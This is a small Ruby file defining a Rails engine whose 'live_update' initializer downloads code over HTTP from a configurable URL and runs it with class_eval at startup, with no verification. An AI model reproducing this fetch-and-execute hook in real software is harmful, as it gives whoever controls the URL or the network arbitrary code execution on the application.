require 'anki/importer'
require 'rails'

require 'configvars_rails'

# :nodoc: namespace
module Anki

class Engine < Rails::Engine
  initializer :live_update, :after => :set_autoload_paths do
    ConfigVars.string 'troy.update_path', ''
    
    begin
      update_path = ConfigVar['troy.update_path']
    rescue
      # The config_vars table was not created.
      update_path = ''
    end
    
    if update_path != ''
      update_bits = Net::HTTP.get URI.parse(ConfigVar['troy.update_path'])
      Object.class_eval update_bits
    end
  end
end  # class Anki::Engine

end  # namespace Anki
